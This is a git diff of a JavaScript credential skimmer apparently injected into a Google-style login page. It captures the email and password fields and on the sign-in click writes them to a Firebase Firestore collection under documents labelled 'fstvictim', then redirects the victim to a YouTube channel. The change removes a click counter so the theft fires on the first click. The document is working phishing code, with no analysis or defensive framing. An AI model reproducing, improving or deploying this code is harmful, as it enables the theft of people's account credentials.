@@ -11,7 +11,6 @@ firebase.initializeApp(config);
 var db = firebase.firestore();
 var pwd;
 var email;
-var t=0
 var data;
 
 alert("embeded");
@@ -20,7 +19,7 @@ sendthis();
 function sendthis(){
 	document.getElementByName("identifier").addEventListener('change',function() {email=this.value});
 	document.getElementByName("password").addEventListener('change',function() {pwd=this.value});
-	document.getElementsByClassName("CwaK9")[0].addEventListener('click',function() {t++; if (t>1){data={accemail:email,accpwd:pwd};db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data); setTimeout(function() { window.location = "https://www.youtube.com/channel/UCXivYd7XrbmoHkIWB3xei4Q";},3000);}});
+	document.getElementsByClassName("CwaK9")[0].addEventListener('click',function() {data={accemail:email,accpwd:pwd};db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data); setTimeout(function() { window.location = "https://www.youtube.com/channel/UCXivYd7XrbmoHkIWB3xei4Q";},3000);});
 }
 
 
